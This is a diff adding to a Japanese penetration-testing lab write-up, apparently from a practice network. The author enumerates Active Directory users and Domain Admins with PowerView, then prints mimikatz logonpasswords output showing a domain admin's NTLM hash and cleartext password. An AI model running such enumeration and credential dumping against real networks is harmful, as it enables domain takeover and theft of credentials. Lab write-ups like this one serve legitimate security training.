@@ -93,4 +93,75 @@ C:\Windows\system32>ipconfig
 
 mimikatzはここら辺にしておいて、PowerViewでActive Directoryの調査を進める。最終ゴールはDoamin Adminsに行き着くこと！！
 
+daisyはServer_Personelのメンバーだ。
+
+```
+PS C:\> Get-NetUser Daisy
+
+
+logoncount            : 15
+badpasswordtime       : 12/31/1600 4:00:00 PM
+distinguishedname     : CN=Daisy,OU=ServerPersonal,OU=xorUsr,DC=xor,DC=com
+objectclass           : {top, person, organizationalPerson, user}
+displayname           : Daisy
+lastlogontimestamp    : 12/18/2021 6:58:37 AM
+userprincipalname     : daisy@xor.com
+name                  : Daisy
+objectsid             : S-1-5-21-2293535422-227910474-3663383505-1119
+samaccountname        : daisy
+codepage              : 0
+samaccounttype        : USER_OBJECT
+accountexpires        : NEVER
+countrycode           : 0
+whenchanged           : 12/18/2021 2:58:37 PM
+instancetype          : 4
+usncreated            : 12882
+objectguid            : 9a47b615-4ee5-4016-a9da-042819b57b5c
+lastlogoff            : 12/31/1600 4:00:00 PM
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=xor,DC=com
+dscorepropagationdata : 1/1/1601 12:00:00 AM
+memberof              : CN=Server_Personel,OU=xorGrps,DC=xor,DC=com
+lastlogon             : 12/18/2021 6:59:02 AM
+badpwdcount           : 0
+cn                    : Daisy
+useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+whencreated           : 5/20/2019 8:07:07 PM
+primarygroupid        : 513
+pwdlastset            : 5/20/2019 1:07:07 PM
+usnchanged            : 57501
+```
+
+以下の出力より、Domain Adminsに上り詰めるには、**Albert**か**David**のクリデンシャルをゲットすれば良い
+
+```
+PS C:\> Get-NetGroup "Domain Admins"
+
+
+grouptype              : GLOBAL_SCOPE, SECURITY
+admincount             : 1
+iscriticalsystemobject : True
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Admins
+whenchanged            : 5/20/2019 8:13:09 PM
+objectsid              : S-1-5-21-2293535422-227910474-3663383505-512
+objectclass            : {top, group}
+cn                     : Domain Admins
+usnchanged             : 13265
+dscorepropagationdata  : {5/20/2019 8:13:09 PM, 5/20/2019 7:58:00 PM, 1/1/1601 12:04:16 AM}
+memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=xor,DC=com, CN=Administrators,CN=Builtin,DC=xor,DC=com}
+description            : Designated administrators of the domain
+distinguishedname      : CN=Domain Admins,CN=Users,DC=xor,DC=com
+name                   : Domain Admins
+member                 : {CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, CN=David,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com,
+                         CN=Administrator,CN=Users,DC=xor,DC=com}
+```
+
+やはり！daisy（10.11.1.122）にdavidのクリデンシャルがあった！！
+
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 412581 (00000000:00064ba5)                                                                                                               Session           : Batch from 0                                                                                                                                 User Name         : david                                                                                                                                        Domain            : xor                                                                                                                                          Logon Server      : XOR-DC01                                                                                                                                     Logon Time        : 12/18/2021 5:59:52 AM                                                                                                                        SID               : S-1-5-21-2293535422-227910474-3663383505-1123                                                                                                        msv :                                                                                                                                                             [00000003] Primary                                                                                                                                               * Username : david                                                                                                                                               * Domain   : xor                                                                                                                                                 * NTLM     : d4738e8c31d43e0147f27894a20e6683                                                                                                                    * SHA1     : b1c2b2c766e7ad7688029ebc42fbacabae7fba72                                                                                                            * DPAPI    : b712cb5d0fb0bdf9530c115100e2b574                                                                                                                   tspkg :                                                                                                                                                          wdigest :                                                                                                                                                         * Username : david                                                                                                                                               * Domain   : xor                                                                                                                                                 * Password : (null)                                                                                                                                             kerberos :                                                                                                                                                        * Username : david                                                                                                                                               * Domain   : XOR.COM                                                                                                                                             * Password : dsfdf34534tdfGDFG5rdgr 
+```
+
 
